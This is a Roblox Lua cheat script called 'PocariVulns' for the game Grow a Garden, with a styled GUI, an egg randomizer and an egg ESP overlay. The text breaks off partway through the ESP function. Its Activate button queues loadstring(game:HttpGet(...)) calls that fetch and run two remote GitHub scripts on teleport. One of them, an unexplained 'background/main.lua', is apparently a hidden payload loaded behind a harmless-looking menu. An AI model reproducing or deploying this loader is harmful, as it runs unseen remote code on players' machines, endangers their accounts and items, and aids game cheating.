local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

-- Error handling setup
print("Script starting...")
local function logError(err)
    print("ERROR: " .. err)
    warn(debug.traceback())
end

local success, err = xpcall(function()
    -- Main variables
    local SCRIPT_URL = "https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/pocarivulns.lua"
    local Activate = _G.PocariVulnsActivated or false

    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    
    -- Create GUI container
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PocariVulns"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    -- Create GUI elements
    local minimizeButton = Instance.new("TextButton")
    minimizeButton.Name = "MinimizeButton"
    minimizeButton.Size = UDim2.new(0, 120, 0, 30)
    minimizeButton.Position = UDim2.new(0, 15, 0, 15)
    minimizeButton.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    minimizeButton.BorderSizePixel = 0
    minimizeButton.Text = "PocariVulns"
    minimizeButton.TextColor3 = Color3.fromRGB(135, 140, 200)
    minimizeButton.TextSize = 11
    minimizeButton.Font = Enum.Font.GothamSemibold
    minimizeButton.Visible = false
    minimizeButton.Parent = screenGui

    local minimizeCorner = Instance.new("UICorner")
    minimizeCorner.CornerRadius = UDim.new(0, 6)
    minimizeCorner.Parent = minimizeButton

    local minimizeStroke = Instance.new("UIStroke")
    minimizeStroke.Color = Color3.fromRGB(45, 50, 80)
    minimizeStroke.Thickness = 1
    minimizeStroke.Parent = minimizeButton

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 380, 0, 240)
    mainFrame.Position = UDim2.new(0.5, -190, 0.5, -120)
    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.Size = UDim2.new(1, 16, 1, 16)
    shadow.Position = UDim2.new(0, -8, 0, -8)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxasset://textures/ui/Controls/DropShadow.png"
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
    shadow.ImageTransparency = 0.2
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(12, 12, 276, 276)
    shadow.ZIndex = -1
    shadow.Parent = mainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame

    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Color3.fromRGB(45, 50, 80)
    mainStroke.Thickness = 1
    mainStroke.Parent = mainFrame

    local titleBar = Instance.new("Frame")
    titleBar.Name = "TitleBar"
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.Position = UDim2.new(0, 0, 0, 0)
    titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    titleBar.BorderSizePixel = 0
    titleBar.Parent = mainFrame

    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = titleBar

    local titleFix = Instance.new("Frame")
    titleFix.Size = UDim2.new(1, 0, 0, 10)
    titleFix.Position = UDim2.new(0, 0, 1, -10)
    titleFix.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    titleFix.BorderSizePixel = 0
    titleFix.Parent = titleBar

    local titleText = Instance.new("TextLabel")
    titleText.Name = "TitleText"
    titleText.Size = UDim2.new(1, -70, 1, 0)
    titleText.Position = UDim2.new(0, 12, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "PocariVulns"
    titleText.TextColor3 = Color3.fromRGB(180, 185, 230)
    titleText.TextSize = 13
    titleText.Font = Enum.Font.GothamBold
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar

    local minimizeBtn = Instance.new("TextButton")
    minimizeBtn.Name = "MinimizeBtn"
    minimizeBtn.Size = UDim2.new(0, 20, 0, 20)
    minimizeBtn.Position = UDim2.new(1, -50, 0, 5)
    minimizeBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
    minimizeBtn.BorderSizePixel = 0
    minimizeBtn.Text = "—"
    minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    minimizeBtn.TextSize = 10
    minimizeBtn.Font = Enum.Font.GothamBold
    minimizeBtn.Parent = titleBar

    local minimizeBtnCorner = Instance.new("UICorner")
    minimizeBtnCorner.CornerRadius = UDim.new(0, 10)
    minimizeBtnCorner.Parent = minimizeBtn

    local closeButton = Instance.new("TextButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(0, 20, 0, 20)
    closeButton.Position = UDim2.new(1, -25, 0, 5)
    closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 100)
    closeButton.BorderSizePixel = 0
    closeButton.Text = "✕"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextSize = 10
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Parent = titleBar

    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 10)
    closeCorner.Parent = closeButton

    local contentContainer = Instance.new("Frame")
    contentContainer.Name = "ContentContainer"
    contentContainer.Size = UDim2.new(1, -8, 1, -64)
    contentContainer.Position = UDim2.new(0, 4, 0, 34)
    contentContainer.BackgroundTransparency = 1
    contentContainer.Parent = mainFrame

    local sidebar = Instance.new("Frame")
    sidebar.Name = "Sidebar"
    sidebar.Size = UDim2.new(0, 140, 1, 0)
    sidebar.Position = UDim2.new(0, 0, 0, 0)
    sidebar.BackgroundColor3 = Color3.fromRGB(8, 10, 18)
    sidebar.BorderSizePixel = 0
    sidebar.Parent = contentContainer

    local sidebarCorner = Instance.new("UICorner")
    sidebarCorner.CornerRadius = UDim.new(0, 8)
    sidebarCorner.Parent = sidebar

    local sidebarStroke = Instance.new("UIStroke")
    sidebarStroke.Color = Color3.fromRGB(35, 40, 65)
    sidebarStroke.Thickness = 1
    sidebarStroke.Parent = sidebar

    local scrollFrame = Instance.new("ScrollingFrame")
    scrollFrame.Name = "TabsScrollFrame"
    scrollFrame.Size = UDim2.new(1, -10, 1, -10)
    scrollFrame.Position = UDim2.new(0, 5, 0, 5)
    scrollFrame.BackgroundTransparency = 1
    scrollFrame.BorderSizePixel = 0
    scrollFrame.ScrollBarThickness = 2
    scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 80, 120)
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 200)
    scrollFrame.Parent = sidebar

    local tabContainer = Instance.new("Frame")
    tabContainer.Name = "TabContainer"
    tabContainer.Size = UDim2.new(1, 0, 0, 200)
    tabContainer.BackgroundTransparency = 1
    tabContainer.Parent = scrollFrame

    local tabLayout = Instance.new("UIListLayout")
    tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
    tabLayout.Padding = UDim.new(0, 6)
    tabLayout.Parent = tabContainer

    local tabPadding = Instance.new("UIPadding")
    tabPadding.PaddingTop = UDim.new(0, 3)
    tabPadding.PaddingBottom = UDim.new(0, 3)
    tabPadding.PaddingLeft = UDim.new(0, 3)
    tabPadding.PaddingRight = UDim.new(0, 3)
    tabPadding.Parent = tabContainer

    local tabs = {}
    local tabContents = {}

    local function createTab(name, layoutOrder)
        local tab = Instance.new("Frame")
        tab.Name = name .. "Tab"
        tab.Size = UDim2.new(1, -6, 0, 32)
        tab.BackgroundColor3 = Color3.fromRGB(18, 22, 35)
        tab.BorderSizePixel = 0
        tab.LayoutOrder = layoutOrder
        tab.Parent = tabContainer
        
        local tabCorner = Instance.new("UICorner")
        tabCorner.CornerRadius = UDim.new(0, 6)
        tabCorner.Parent = tab
        
        local tabStroke = Instance.new("UIStroke")
        tabStroke.Color = Color3.fromRGB(40, 45, 70)
        tabStroke.Thickness = 1
        tabStroke.Parent = tab
        
        local tabButton = Instance.new("TextButton")
        tabButton.Name = "TabButton"
        tabButton.Size = UDim2.new(1, 0, 1, 0)
        tabButton.BackgroundTransparency = 1
        tabButton.Text = ""
        tabButton.Parent = tab
        
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Name = "NameLabel"
        nameLabel.Size = UDim2.new(1, -16, 1, 0)
        nameLabel.Position = UDim2.new(0, 8, 0, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = name
        nameLabel.TextColor3 = Color3.fromRGB(130, 140, 190)
        nameLabel.TextSize = 11
        nameLabel.Font = Enum.Font.GothamSemibold
        nameLabel.TextXAlignment = Enum.TextXAlignment.Center
        nameLabel.TextYAlignment = Enum.TextYAlignment.Center
        nameLabel.Parent = tab
        
        tabs[name] = {
            frame = tab,
            button = tabButton,
            label = nameLabel,
            stroke = tabStroke
        }
        
        tabButton.MouseEnter:Connect(function()
            if name == "Main" or Activate then
                local tween = TweenService:Create(tab, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(25, 30, 45)})
                tween:Play()
                local strokeTween = TweenService:Create(tabStroke, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {Color = Color3.fromRGB(60, 70, 110)})
                strokeTween:Play()
                local textTween = TweenService:Create(nameLabel, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {TextColor3 = Color3.fromRGB(160, 170, 220)})
                textTween:Play()
            end
        end)
        
        tabButton.MouseLeave:Connect(function()
            if name == "Main" or Activate then
                local tween = TweenService:Create(tab, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(18, 22, 35)})
                tween:Play()
                local strokeTween = TweenService:Create(tabStroke, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {Color = Color3.fromRGB(40, 45, 70)})
                strokeTween:Play()
                local textTween = TweenService:Create(nameLabel, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {TextColor3 = Color3.fromRGB(130, 140, 190)})
                textTween:Play()
            end
        end)
        
        return tab
        end
        
    createTab("Main", 1)
    createTab("Egg Randomizer", 2)
    createTab("Button 3", 3)
    createTab("Button 4", 4)
    createTab("Button 5", 5)

    local contentArea = Instance.new("Frame")
    contentArea.Name = "ContentArea"
    contentArea.Size = UDim2.new(1, -146, 1, 0)
    contentArea.Position = UDim2.new(0, 146, 0, 0)
    contentArea.BackgroundColor3 = Color3.fromRGB(5, 8, 15)
    contentArea.BorderSizePixel = 0
    contentArea.Parent = contentContainer

    local contentCorner = Instance.new("UICorner")
    contentCorner.CornerRadius = UDim.new(0, 8)
    contentCorner.Parent = contentArea

    local contentStroke = Instance.new("UIStroke")
    contentStroke.Color = Color3.fromRGB(35, 40, 65)
    contentStroke.Thickness = 1
    contentStroke.Parent = contentArea

    local watermarkFrame = Instance.new("Frame")
    watermarkFrame.Name = "WatermarkFrame"
    watermarkFrame.Size = UDim2.new(1, 0, 0, 26)
    watermarkFrame.Position = UDim2.new(0, 0, 1, -26)
    watermarkFrame.BackgroundColor3 = Color3.fromRGB(5, 8, 15)
    watermarkFrame.BorderSizePixel = 0
    watermarkFrame.ZIndex = 10
    watermarkFrame.Parent = mainFrame

    local watermarkCorner = Instance.new("UICorner")
    watermarkCorner.CornerRadius = UDim.new(0, 10)
    watermarkCorner.Parent = watermarkFrame

    local watermarkFix = Instance.new("Frame")
    watermarkFix.Size = UDim2.new(1, 0, 0, 10)
    watermarkFix.Position = UDim2.new(0, 0, 0, 0)
    watermarkFix.BackgroundColor3 = Color3.fromRGB(5, 8, 15)
    watermarkFix.BorderSizePixel = 0
    watermarkFix.Parent = watermarkFrame

    local watermarkText = Instance.new("TextLabel")
    watermarkText.Name = "WatermarkText"
    watermarkText.Size = UDim2.new(1, 0, 1, 0)
    watermarkText.Position = UDim2.new(0, 0, 0, 0)
    watermarkText.BackgroundTransparency = 1
    watermarkText.Text = "made by @pocarisv"
    watermarkText.TextColor3 = Color3.fromRGB(70, 80, 120)
    watermarkText.TextSize = 9
    watermarkText.Font = Enum.Font.GothamSemibold
    watermarkText.TextXAlignment = Enum.TextXAlignment.Center
    watermarkText.ZIndex = 11
    watermarkText.Parent = watermarkFrame

    minimizeBtn.MouseEnter:Connect(function()
        local tween = TweenService:Create(minimizeBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(100, 140, 255)})
        tween:Play()
    end)

    minimizeBtn.MouseLeave:Connect(function()
        local tween = TweenService:Create(minimizeBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)})
        tween:Play()
    end)

    closeButton.MouseEnter:Connect(function()
        local tween = TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(200, 80, 120)})
        tween:Play()
    end)

    closeButton.MouseLeave:Connect(function()
        local tween = TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(180, 60, 100)})
        tween:Play()
    end)

    minimizeButton.MouseEnter:Connect(function()
        local tween = TweenService:Create(minimizeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(20, 22, 35)})
        tween:Play()
    end)

    minimizeButton.MouseLeave:Connect(function()
        local tween = TweenService:Create(minimizeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(15, 15, 25)})
        tween:Play()
    end)

    local isMinimizing = false
    local isRestoring = false
    local isClosing = false

    minimizeBtn.MouseButton1Click:Connect(function()
        if isMinimizing or isRestoring or isClosing then return end
        isMinimizing = true
        
        local currentPos = mainFrame.Position
        local targetPos = UDim2.new(0, 75, 0, 30)
        
        local shrinkTween = TweenService:Create(
            mainFrame,
            TweenInfo.new(0.35, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut),
            {
                Size = UDim2.new(0, 0, 0, 0), 
                Position = targetPos
            }
        )
        
        local fadeTween = TweenService:Create(
            mainFrame,
            TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 1}
        )
        
        shrinkTween:Play()
        wait(0.1)
        fadeTween:Play()
        
        shrinkTween.Completed:Connect(function()
            mainFrame.Visible = false
            mainFrame.BackgroundTransparency = 0
            
            minimizeButton.Visible = true
            minimizeButton.Size = UDim2.new(0, 0, 0, 0)
            minimizeButton.Position = targetPos
            minimizeButton.BackgroundTransparency = 1
            
            local appearTween = TweenService:Create(
                minimizeButton,
                TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                {Size = UDim2.new(0, 120, 0, 30)}
            )
            
            local fadeInTween = TweenService:Create(
                minimizeButton,
                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {BackgroundTransparency = 0}
            )
            
            appearTween:Play()
            fadeInTween:Play()
            
            appearTween.Completed:Connect(function()
                isMinimizing = false
            end)
        end)
    end)

    minimizeButton.MouseButton1Click:Connect(function()
        if isMinimizing or isRestoring or isClosing then return end
        isRestoring = true
        
        local hideTween = TweenService:Create(
            minimizeButton,
            TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut),
            {
                Size = UDim2.new(0, 0, 0, 0),
                BackgroundTransparency = 1
            }
        )
        hideTween:Play()
        
        hideTween.Completed:Connect(function()
            minimizeButton.Visible = false
            minimizeButton.BackgroundTransparency = 0
            
            mainFrame.Visible = true
            mainFrame.Size = UDim2.new(0, 0, 0, 0)
            mainFrame.Position = minimizeButton.Position
            mainFrame.BackgroundTransparency = 1
            
            local restoreTween = TweenService:Create(
                mainFrame,
                TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0),
                {
                    Size = UDim2.new(0, 380, 0, 240), 
                    Position = UDim2.new(0.5, -190, 0.5, -120)
                }
            )
            
            local fadeInTween = TweenService:Create(
                mainFrame,
                TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {BackgroundTransparency = 0}
            )
            
            restoreTween:Play()
            wait(0.1)
            fadeInTween:Play()
            
            restoreTween.Completed:Connect(function()
                isRestoring = false
            end)
        end)
    end)
        
    closeButton.MouseButton1Click:Connect(function()
        if isMinimizing or isRestoring or isClosing then return end
        isClosing = true
        
        local closeTween = TweenService:Create(
            mainFrame,
            TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut),
            {
                Size = UDim2.new(0, 0, 0, 0), 
                Position = UDim2.new(0.5, 0, 0.5, 0)
            }
        )
        
        local fadeTween = TweenService:Create(
            mainFrame,
            TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 1}
        )
        
        local shadowFadeTween = TweenService:Create(
            shadow,
            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {ImageTransparency = 1}
        )
        
        closeTween:Play()
        fadeTween:Play()
        shadowFadeTween:Play()
        
        closeTween.Completed:Connect(function()
            screenGui:Destroy()
        end)
    end)

    local dragging = false
    local dragStart = nil
    local startPos = nil

    local function startDrag(input)
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end

    local function updateDrag(input)
        if dragging then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end

    local function endDrag()
        dragging = false
    end

    titleBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            startDrag(input)
        end
    end)

    minimizeButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragStart = input.Position
            startPos = minimizeButton.Position
            dragging = true
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            if dragging and mainFrame.Visible then
                updateDrag(input)
            elseif dragging and minimizeButton.Visible then
                local delta = input.Position - dragStart
                minimizeButton.Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            end
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            endDrag()
        end
    end)

    mainFrame.Size = UDim2.new(0, 0, 0, 0)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)

    local spawnTween = TweenService:Create(
        mainFrame,
        TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Size = UDim2.new(0, 380, 0, 240), Position = UDim2.new(0.5, -190, 0.5, -120)}
    )
    spawnTween:Play()

    -- Create Main tab content
    local function createMainTabContent()
        local mainContent = Instance.new("Frame")
        mainContent.Name = "MainContent"
        mainContent.Size = UDim2.new(1, 0, 1, 0)
        mainContent.BackgroundTransparency = 1
        mainContent.Visible = false
        mainContent.Parent = contentArea
        
        local welcomeLabel = Instance.new("TextLabel")
        welcomeLabel.Name = "WelcomeLabel"
        welcomeLabel.Size = UDim2.new(1, -40, 0, 60)
        welcomeLabel.Position = UDim2.new(0, 20, 0, 30)
        welcomeLabel.BackgroundTransparency = 1
        welcomeLabel.Text = "Welcome! Please press the button below to access our scripts."
        welcomeLabel.TextColor3 = Color3.fromRGB(180, 185, 230)
        welcomeLabel.TextSize = 12
        welcomeLabel.Font = Enum.Font.GothamSemibold
        welcomeLabel.TextWrapped = true
        welcomeLabel.TextXAlignment = Enum.TextXAlignment.Center
        welcomeLabel.Parent = mainContent
        
        local activateButton = Instance.new("TextButton")
        activateButton.Name = "ActivateButton"
        activateButton.Size = UDim2.new(0, 120, 0, 35)
        activateButton.Position = UDim2.new(0.5, -60, 0.5, -17.5)
        activateButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
        activateButton.BorderSizePixel = 0
        activateButton.Text = "Activate"
        activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        activateButton.TextSize = 12
        activateButton.Font = Enum.Font.GothamBold
        activateButton.Parent = mainContent
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = activateButton
        
        local buttonStroke = Instance.new("UIStroke")
        buttonStroke.Color = Color3.fromRGB(120, 160, 255)
        buttonStroke.Thickness = 1
        buttonStroke.Parent = activateButton
        
        activateButton.MouseEnter:Connect(function()
            TweenService:Create(activateButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 140, 255)}):Play()
            TweenService:Create(buttonStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(140, 180, 255)}):Play()
        end)
        
        activateButton.MouseLeave:Connect(function()
            TweenService:Create(activateButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)}):Play()
            TweenService:Create(buttonStroke, TweenInfo.new(0.15), {Color = Color3.fromRGB(120, 160, 255)}):Play()
        end)
        
        activateButton.MouseButton1Click:Connect(function()
            Activate = true
            _G.PocariVulnsActivated = true
            
            for name, tab in pairs(tabs) do
                if name ~= "Main" then
                    tab.button.Active = true
                    tab.label.TextColor3 = Color3.fromRGB(130, 140, 190)
                end
            end
            
            if SCRIPT_URL and SCRIPT_URL ~= "https://your-raw-script-url-here.lua" then
                queue_on_teleport(string.format([[
                    _G.PocariVulnsActivated = true
                    loadstring(game:HttpGet("%s", true))()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
                ]], SCRIPT_URL))
            end
            
            welcomeLabel.Text = "Activated! Please select a script from the sidebar."
            activateButton.Visible = false
        end)
        
        return mainContent
    end

    -- Create Egg Randomizer tab content
    local function createEggRandomizerContent()
        local content = Instance.new("Frame")
        content.Name = "EggRandomizerContent"
        content.Size = UDim2.new(1, 0, 1, 0)
        content.BackgroundTransparency = 1
        content.Visible = false
        content.Parent = contentArea
        
        local title = Instance.new("TextLabel")
        title.Name = "Title"
        title.Size = UDim2.new(1, 0, 0, 30)
        title.Position = UDim2.new(0, 0, 0, 10)
        title.BackgroundTransparency = 1
        title.Text = "🐾 Egg Randomizer ✨"
        title.Font = Enum.Font.GothamBold
        title.TextSize = 16
        title.TextColor3 = Color3.fromRGB(180, 185, 230)
        title.TextXAlignment = Enum.TextXAlignment.Center
        title.Parent = content
        
        local randomizeBtn = Instance.new("TextButton")
        randomizeBtn.Name = "RandomizeButton"
        randomizeBtn.Size = UDim2.new(0.9, 0, 0, 35)
        randomizeBtn.Position = UDim2.new(0.05, 0, 0, 50)
        randomizeBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
        randomizeBtn.Text = "🎲 Randomize Pets"
        randomizeBtn.TextSize = 14
        randomizeBtn.Font = Enum.Font.GothamBold
        randomizeBtn.TextColor3 = Color3.new(1, 1, 1)
        randomizeBtn.Parent = content
        
        local toggleBtn = Instance.new("TextButton")
        toggleBtn.Name = "ToggleButton"
        toggleBtn.Size = UDim2.new(0.9, 0, 0, 35)
        toggleBtn.Position = UDim2.new(0.05, 0, 0, 95)
        toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        toggleBtn.Text = "👁️ ESP: ON"
        toggleBtn.TextSize = 14
        toggleBtn.Font = Enum.Font.GothamBold
        toggleBtn.TextColor3 = Color3.new(1, 1, 1)
        toggleBtn.Parent = content
        
        local autoBtn = Instance.new("TextButton")
        autoBtn.Name = "AutoButton"
        autoBtn.Size = UDim2.new(0.9, 0, 0, 35)
        autoBtn.Position = UDim2.new(0.05, 0, 0, 140)
        autoBtn.BackgroundColor3 = Color3.fromRGB(80, 150, 60)
        autoBtn.Text = "🔁 Auto Randomize: OFF"
        autoBtn.TextSize = 14
        autoBtn.Font = Enum.Font.GothamBold
        autoBtn.TextColor3 = Color3.new(1, 1, 1)
        autoBtn.Parent = content
        
        -- Add corners and strokes to match style
        for _, btn in ipairs({randomizeBtn, toggleBtn, autoBtn}) do
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 6)
            corner.Parent = btn
            
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(120, 160, 255)
            stroke.Thickness = 1
            stroke.Parent = btn
        end
        
        -- Button hover effects
        randomizeBtn.MouseEnter:Connect(function()
            TweenService:Create(randomizeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 160, 40)}):Play()
        end)
        randomizeBtn.MouseLeave:Connect(function()
            TweenService:Create(randomizeBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 140, 0)}):Play()
        end)
        
        toggleBtn.MouseEnter:Connect(function()
            TweenService:Create(toggleBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)}):Play()
        end)
        toggleBtn.MouseLeave:Connect(function()
            TweenService:Create(toggleBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
        end)
        
        autoBtn.MouseEnter:Connect(function()
            TweenService:Create(autoBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 180, 80)}):Play()
        end)
        autoBtn.MouseLeave:Connect(function()
            TweenService:Create(autoBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 150, 60)}):Play()
        end)
        
        return content
    end

    -- Create placeholder content for other tabs
    local function createPlaceholderTabContent(name)
        local content = Instance.new("Frame")
        content.Name = name .. "Content"
        content.Size = UDim2.new(1, 0, 1, 0)
        content.BackgroundTransparency = 1
        content.Visible = false
        content.Parent = contentArea
        
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -40, 1, -40)
        label.Position = UDim2.new(0, 20, 0, 20)
        label.BackgroundTransparency = 1
        label.Text = "Content for " .. name .. " will appear here"
        label.TextColor3 = Color3.fromRGB(180, 185, 230)
        label.TextSize = 12
        label.Font = Enum.Font.GothamSemibold
        label.TextWrapped = true
        label.TextXAlignment = Enum.TextXAlignment.Center
        label.TextYAlignment = Enum.TextYAlignment.Center
        label.Parent = content
        
        return content
    end

    -- Initialize tab contents
    tabContents["Main"] = createMainTabContent()
    tabContents["Egg Randomizer"] = createEggRandomizerContent()
    tabContents["Button 3"] = createPlaceholderTabContent("Button 3")
    tabContents["Button 4"] = createPlaceholderTabContent("Button 4")
    tabContents["Button 5"] = createPlaceholderTabContent("Button 5")

    -- Set initial tab visibility
    tabContents["Main"].Visible = true
    for name, content in pairs(tabContents) do
        if name ~= "Main" then
            content.Visible = false
        end
    end

    -- Tab switching functionality
    for name, tab in pairs(tabs) do
        tab.button.MouseButton1Click:Connect(function()
            if name == "Main" or Activate then
                for _, content in pairs(tabContents) do
                    content.Visible = false
                end
                if tabContents[name] then
                    tabContents[name].Visible = true
                end
            end
        end)
    end

    -- Egg Randomizer variables and functions
    local petTable = {
        ["Common Egg"] = { "Dog", "Bunny", "Golden Lab" },
        ["Uncommon Egg"] = { "Chicken", "Black Bunny", "Cat", "Deer" },
        ["Rare Egg"] = { "Pig", "Monkey", "Rooster", "Orange Tabby", "Spotted Deer" },
        ["Legendary Egg"] = { "Cow", "Polar Bear", "Sea Otter", "Turtle", "Silver Monkey" },
        ["Mythical Egg"] = { "Grey Mouse", "Brown Mouse", "Squirrel", "Red Giant Ant" },
        ["Bug Egg"] = { "Snail", "Caterpillar", "Giant Ant", "Praying Mantis" },
        ["Night Egg"] = { "Frog", "Hedgehog", "Mole", "Echo Frog", "Night Owl", },
        ["Bee Egg"] = { "Bee", "Honey Bee", "Bear Bee", "Petal Bee" },
        ["Anti Bee Egg"] = { "Wasp", "Moth", "Tarantula Hawk" },
        ["Oasis Egg"] = { "Meerkat", "Sand Snake", "Axolotl" },
        ["Paradise Egg"] = { "Ostrich", "Peacock", "Capybara" },
        ["Dinosaur Egg"] = { "Raptor", "Triceratops", "Stegosaurus" },
        ["Primal Egg"] = { "Parasaurolophus", "Iguanodon", "Pachycephalosaurus" },
    }
    local espEnabled = true
    local truePetMap = {}
    local autoRunning = false
    local bestPets = {
        ["Raccoon"] = true, ["Dragonfly"] = true, ["Queen Bee"] = true,
        ["Disco Bee"] = true, ["Fennec Fox"] = true, ["Fox"] = true,
        ["Mimic Octopus"] = true
    }

    -- Egg Randomizer functions
    local function glitchLabelEffect(label)
        coroutine.wrap(function()
            local original = label.TextColor3
            for i = 1, 2 do
                label.TextColor3 = Color3.new(1, 0, 0)
                wait(0.07)
                label.TextColor3 = original
                wait(0.07)
            end
        end)()
    end

    local function applyEggESP(eggModel, petName)
        local existingLabel = eggModel:FindFirstChild("PetBillboard", true)
        if existingLabel then existingLabel:Destroy() end
        local existingHighlight = eggModel:FindFirstChild("ESPHighlight")
        if existingHighlight then existingHighlight:Destroy() end
        if not espEnabled then return end

        local basePart = eggModel:FindFirstChildWhichIsA("BasePart")
        if not basePart then return end

        local hatchReady = true
        local hatchTime = eggModel:FindFirstChild("HatchTime")
        local readyFlag = eggModel:FindFirstChild("ReadyToHatch")

        if hatchTime and hatchTime:IsA("NumberValue") and hatchTime.Value > 0 then
            hatchReady = false
        elseif readyFlag and readyFlag:IsA("BoolValue") and not readyFlag.Value then
            hatchReady = false
        end

        local billboard = Instance.new("BillboardGui")
        billboard.Name = "PetBillboard"
        billboard.Size = UDim2.new(0, 270, 0, 50)
        billboard.StudsOffset = Vector3.new(0, 4.5, 0)
        billboard.AlwaysOnTop = true
